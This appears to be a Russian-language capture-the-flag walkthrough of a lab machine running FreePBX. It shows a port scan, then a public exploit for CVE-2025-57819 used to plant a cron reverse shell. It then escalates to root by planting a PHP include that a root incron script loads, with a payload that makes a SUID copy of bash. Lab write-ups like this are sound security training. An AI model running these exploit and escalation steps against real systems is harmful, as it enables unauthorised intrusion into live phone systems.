# Сканируем порты

nmap -T5 -p- 10.129.124.240
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

<img width="1655" height="1100" alt="{B197EFD2-E594-4632-AA8B-3C6239EA6339}" src="https://github.com/user-attachments/assets/0eb73f3a-63fd-4076-8895-011819c14731" /> 

на 443 тоже самое
<img width="1645" height="1097" alt="{868C317F-9B17-4A46-8D73-2F5424D1589D}" src="https://github.com/user-attachments/assets/3700e485-2075-4b11-b25b-6280b958fe3d" />

# Получение RCE

видим FreePBX 16.0.40.7, гуглим cve, находим - CVE-2025-57819 которая приводит к rce 
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
нашел poc
https://github.com/K3ysTr0K3R/CVE-2025-57819/blob/main/exploit.py

┌──(lsd㉿lsd)-[~]
└─$ python3 sck.py -u https://10.129.124.240/ --lhost xxxxxxx --lport 4444
CVE-2025-57819 • FreePBX SQLi → RCE
Coded By: K3ysTr0K3R
Need a hug? ʕっ•ᴥ•ʔっ

[*] Target locked: https://10.129.124.240/
[-] Listener deployment failed: [Errno 99] Cannot assign requested address
[+] Exploit path confirmed!
[*] Injecting payload into cron schedule...
[+] Payload planted successfully (server response: 500)
[*] Awaiting trigger activation (cron will fire within ~60 seconds)...
[*] Backdoor callback expected from xxxxxxx:4444 in the next 60–90 seconds...

<img width="956" height="753" alt="{7D5722FE-4608-404C-9AFF-F056850F8DB3}" src="https://github.com/user-attachments/assets/52986460-bdf5-4dc7-883c-dfb2021eee57" />

[asterisk@connected ~]$ cat /home/asterisk/user.txt
cat /home/asterisk/user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
в процессе поиска lpe у меня сломалась лаба, по этому пришлось ее перезагрузить.


# lpe до root

я запустил pspy64
вижу что root запускает файл safe_asterisk, скорее всего если у меня есть доступ перезаписать файл то я могу получить root
сейчас буду проверять эту теорию 
-rwxr-xr-x 1 root root 6921 Nov 26  2025 /usr/sbin/safe_asterisk :((
ну че, придется читать скрипт
...........................
ну почитал, попробовал почти все но это явно не тот вектор
перешел к проверке incron
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager

cat /usr/sbin/sysadmin_ha
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
        require_once($i);
        $incron = new incron;
        $incron->rootTrigger();

ls -la /usr/local/asterisk/ls -la /usr/local/asterisk/ha_trigger
-rwxrwxrwx. 1 asterisk asterisk 0 Apr 15  2021 /usr/local/asterisk/ha_trigger
[asterisk@connected asterisk]$ 
ls -la /usr/local/asterisk/
total 0
drwxr-xr-x.  3 asterisk asterisk  38 Nov 30  2025 .
drwxr-xr-x. 13 root     root     147 Nov 30  2025 ..
-rwxrwxrwx.  1 asterisk asterisk   0 Apr 15  2021 ha_trigger
drwxrwxrwx.  2 asterisk asterisk   6 Apr 15  2021 incron



sysadmin_ha запускается от root через incron.
он подгружает /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php и вызывает rootTrigger.
поискав директорию я ее не нашел.
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc/
закидываем туда наш poc 
<?php
class incron {
    public function rootTrigger() {
        exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash');
    }
}

и треггирим ее echo 1 > /usr/local/asterisk/ha_trigger так как он реактит на изменение ha_trigger и юзает при изменении ha_trigger скритп /usr/sbin/sysadmin_ha
который в свою очередь запускает php от рута и юзает incron.php который в котором находиться наш poc, триггерим его через echo 1 > ha_trigger 
-rwsr-sr-x 1 root root 964536 Sep 11 03:06 /tmp/bash
[asterisk@connected asterisk]$ /tmp/bash -p 
/tmp/bash -p 
id
uid=999(asterisk) gid=1000(asterisk) euid=0(root) egid=0(root) groups=0(root),1000(asterisk)

cat /root/root.txt
2cfe3xxxxxxxxxxxxxxx


